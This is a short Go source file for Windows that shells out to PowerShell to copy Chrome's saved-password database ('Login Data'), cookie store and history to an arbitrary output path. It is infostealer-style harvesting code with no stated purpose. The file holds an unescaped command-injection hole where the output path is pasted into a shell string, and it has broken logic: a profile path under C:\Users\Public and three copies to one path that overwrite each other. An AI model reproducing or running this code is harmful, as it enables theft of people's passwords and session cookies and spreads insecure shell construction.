//go:build windows

package collector

import (
"os/exec"
)

func CollectBrowserData(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' '"+outputPath+"'\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func CollectBrowserCookies(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' '"+outputPath+"'\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func CollectBrowserHistory(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History' '"+outputPath+"'\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func CollectAllBrowserData(outputPath string) bool {
CollectBrowserData(outputPath)
CollectBrowserCookies(outputPath)
CollectBrowserHistory(outputPath)
return true
}
